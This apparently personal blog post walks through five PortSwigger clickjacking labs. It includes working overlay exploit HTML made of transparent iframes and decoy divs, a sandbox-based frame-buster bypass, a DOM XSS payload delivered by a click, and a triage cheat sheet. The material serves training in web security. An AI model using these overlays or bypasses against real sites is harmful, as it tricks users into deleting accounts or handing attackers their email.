---
layout: mission
title: "Mastering Clickjacking: A Deep Dive into PortSwigger Labs (Part 2)"
date: 2025-12-20
categories: [Web Security, Clickjacking]
toc: true
---

# 🧠 Understanding Clickjacking Exploitation



Clickjacking (UI Redressing) exploits the browser's ability to overlay transparent frames. By positioning an invisible iframe of a target site over a deceptive "decoy" site, attackers can trick users into performing actions they never intended—like deleting accounts or transferring money.

This guide breaks down **five** distinct exploitation scenarios found in the PortSwigger Web Security Academy, demonstrating how to bypass common defenses like CSRF tokens and Frame Busters.

---

## 🧪 LAB 1: Basic Clickjacking with CSRF Token Protection

### 🧐 How the Vulnerability Exists
The application allows users to delete their account via a button click. It uses CSRF tokens, but **CSRF tokens do not stop Clickjacking**. Since the user is clicking the *real* button inside the *real* session (just invisibly), the browser sends the valid token automatically.

**Root Cause:** Missing `X-Frame-Options` or CSP `frame-ancestors` headers, allowing the site to be framed by an attacker.

### 🚨 Exploitation Steps

1.  **Analyze Request:**
    Log in and identify the "Delete Account" button.
    
2.  **Construct Exploit:**
    Create an HTML page with an iframe targeting the account page. Use CSS to make it transparent (`opacity: 0.0001`) and position it over a decoy text ("Click me").
  ```
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        opacity: 0.000001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a2500eb03f23a1089d0e7af000d00d3.web-security-academy.net/my-account"></iframe>
```
   

4.  **Align & Execute:**
    Adjust the `top` and `left` pixels until the "Delete" button sits exactly on top of "Click me".
    Change opacity to `0.0001`.
    When the victim clicks "Click me", they actually click "Delete Account".

**IMPACT:** Unauthorized account deletion.

---

## 🧪 LAB 2: Clickjacking with Form Input Data Prefilled

### 🧐 How the Vulnerability Exists
Standard Clickjacking cannot force a user to *type* data. However, this application allows form fields (like email) to be pre-filled via URL parameters (e.g., `?email=hacker@evil.com`).

**Root Cause:** The application reflects URL parameters into input fields without preventing framing.

### 🚨 Exploitation Steps

1.  **Identify Gadget:**
    Verify that visiting `/my-account?email=hacker@evil.com` loads the page with the email field already populated.

2.  **Construct Exploit:**
    Point the iframe to the pre-filled URL.
    Align the decoy over the "Update Email" button.
    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-user.net"></iframe>
    ```
  
   ```
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        opacity: 0.000001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0aa400850409c3b480e2dafc009b0079.web-security-academy.net/my-account?email=afaw@gmail.com"></iframe>
```

3.  **Execute:**
    The victim sees "Click to Win". They click it. The hidden iframe (already filled with the attacker's email) submits the "Update" request.

**IMPACT:** Account takeover via email change.

---

## 🧪 LAB 3: Clickjacking with a Frame Buster Script

### 🧐 How the Vulnerability Exists
The application uses a JavaScript "Frame Buster" to prevent being framed (`if (top != self) top.location = self.location`). This normally breaks the attack by redirecting the top window.

**Root Cause:** Frame busters can be neutralized using the HTML5 `sandbox` attribute.

### 🚨 Exploitation Steps

1.  **Bypass Defense:**
    Use the `sandbox="allow-forms"` attribute on the iframe. This enables form submission but **blocks** the frame buster script from navigating the top window or running complex JS.
    ```
    <iframe sandbox="allow-forms" src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-user.net"></iframe>
    ```
  ```
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        opacity: 0.000001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a3e004d044a193b8090d52600aa00b0.web-security-academy.net/my-account?email=afaw@gmail.com"></iframe>
```
   
2.  **Execute:**
    The browser loads the iframe but prevents the protection script from running. The clickjacking attack proceeds as normal.

---

## 🧪 LAB 4: Exploiting Clickjacking to Trigger DOM XSS

### 🧐 How the Vulnerability Exists
The application has a **DOM XSS** vulnerability that only triggers when a form is submitted (e.g., it reflects the user's name from the input into the page logic).

**Root Cause:** Combining Clickjacking with Self-XSS to achieve Reflected XSS impact.

### 🚨 Exploitation Steps

1.  **Prepare XSS Payload:**
    Identify the XSS vector: `?name=<img src=1 onerror=print()>` triggers the XSS upon form submission.

2.  **Construct Exploit:**
    Load the iframe with the XSS payload pre-filled in the URL.
    Align the decoy over the "Submit Feedback" button.
    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker.com"></iframe>
    ```
  ```
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        opacity: 0.000001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:800px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a70002a03e342be81058a8e0086007c.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=test12@gmail.com&subject=asd&message=ffesf"></iframe>
```
   
3.  **Execute:**
    The victim clicks "Click me". The form submits. The application processes the input and executes the XSS payload (`print()`) in the victim's browser.

**IMPACT:** Escalating Self-XSS to attack other users.

---

## 🧪 LAB 5: Multistep Clickjacking

### 🧐 How the Vulnerability Exists
The application requires confirmation for sensitive actions (e.g., "Delete" -> "Are you sure? Yes"). A single click is not enough.

**Root Cause:** The attacker can orchestrate multiple clicks by moving the user or the decoys.

### 🚨 Exploitation Steps

1.  **Analyze Workflow:**
    Click 1: "Delete Account".
    Click 2: "Yes, Confirm".

2.  **Construct Exploit:**
    Create two decoy `div` elements.
    * **Decoy 1:** "Click me first" (Aligned over "Delete").
    * **Decoy 2:** "Click me next" (Aligned over "Yes").
    ```
    <div class="firstClick">Click me first</div>
    <div class="secondClick">Click me next</div>
    <iframe src="..."></iframe>
    ```
  ```
<iframe src="https://0afd001e044cc16180d5175400c20096.web-security-academy.net/my-account" style="opacity:0.00001%; position:absolute; width:500px; height:600px;z-index: 2;">
</iframe> 

<div style="position:absolute; top:500px; left:50px; z-index: 1;">Click me first</div>
<div style="position:absolute; top:295px; left:220px; z-index: 1;">Click me next</div>
```

   
3.  **Execute:**
    The victim clicks the first button (triggering the popup in the hidden frame), then clicks the second button (confirming the action).

**IMPACT:** Bypassing confirmation dialogs.

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **Basic** | No `X-Frame-Options`. | Iframe + `opacity:0` + `z-index`. |
| **Prefilled** | URL params fill inputs. | Iframe src `?email=hacker@evil.com`. |
| **Frame Buster** | "Frame breaker" JS exists. | `<iframe sandbox="allow-forms">`. |
| **DOM XSS** | XSS triggers on submit. | Prefill payload + Clickjack "Submit". |
| **Multistep** | "Are you sure?" popup. | Two decoys aligned over sequence. |
